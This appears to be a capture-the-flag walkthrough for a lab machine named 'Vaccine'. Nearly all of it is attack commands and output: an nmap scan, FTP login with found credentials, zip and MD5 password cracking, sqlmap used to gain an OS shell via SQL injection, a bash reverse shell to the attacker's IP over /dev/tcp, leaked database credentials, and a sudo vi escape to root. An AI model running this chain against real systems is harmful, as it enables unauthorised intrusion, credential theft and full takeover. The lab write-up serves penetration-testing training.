inet 10.10.14.69  netmask 255.255.254.0
inet6 fe80::d484:44d2:fd97:c02c

# Vaccine

## nmap

<pre>
sudo nmap -sC -sV -A 10.10.10.46

Nmap scan report for 10.10.10.46
Host is up (0.24s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: MegaCorp Login

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT       ADDRESS
1   244.85 ms 10.10.14.1
2   244.90 ms 10.10.10.46
</pre>

## Need to install ftp

<pre>
ftp 10.10.10.46
username: ftpuser
password: mc@F1l3ZilL4

get the backup.zip
</pre>

## Use zip hash to crack

<pre>
zip2john backup.zip > backup.hash
john backup.hash --show (741852963)
unzip backup.zip in this password
</pre>

## Try login on [index.php](./ftp/backup/index.php)

<pre>
username: admin
password (md5 reverse): 2cb42f8734ea607eefed3b70af13bbd3 ( qwerty789)
</pre>

## Sqlmap to hack os shell

> sqlmap 10.10.10.46/dashboard.php?search=whatever --cookie="PHPSESSID=01aruoep6i9jf18e8ho8runboo" --os-shell

**pwd**
> /var/lib/postgresql/11/main

**change cmd**
*source*
> bash -c 'bash -i >& /dev/tcp/10.10.14.69/8001 0>&1'
*destination*
> nc -lvnp 8001

**id**
> uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)

- postgresql account in [/var/www/html/dashboard.php](./dashboard.php)
> username: postgres
> password: P@s5w0rd!
> port:     5432 (omit)
> dbname:   carsdb

## Sudo lists all privilege command can do

> sudo -l

<pre>
Matching Defaults entries for postgres on vaccine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
</pre>

- postgres can use vi in /bin/vi
> which vi
> /usr/bin/vi

- use sudo vi to get root
> sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
> :!/bin/bash -P

<pre>
root.txt
dd6e058e814260bc70e9bbdef2715849
</pre>